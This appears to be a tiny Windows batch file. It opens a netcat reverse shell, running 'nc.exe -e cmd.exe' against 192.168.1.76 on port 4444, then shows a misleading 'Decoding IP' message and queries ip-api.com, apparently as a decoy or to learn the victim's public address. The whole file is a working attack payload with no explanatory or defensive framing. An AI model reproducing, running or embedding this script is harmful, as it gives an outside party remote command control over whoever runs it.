@echo off
nc.exe -e cmd.exe 192.168.1.76 4444
echo [+] Decoding IP....
curl ip-api.com
pause